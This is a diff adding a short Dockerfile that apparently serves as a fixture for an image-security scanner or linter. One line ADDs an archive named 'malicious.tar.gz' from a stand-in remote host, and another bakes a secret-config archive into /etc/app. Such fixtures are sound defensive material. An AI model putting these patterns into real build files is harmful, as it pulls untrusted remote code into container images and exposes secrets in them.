@@ -1,0 +1,6 @@
+FROM alpine:3.18
+ADD https://example.com/malicious.tar.gz /opt/
+ADD secret-config.tar.gz /etc/app/
+WORKDIR /app
+COPY . .
+CMD ["sh"]
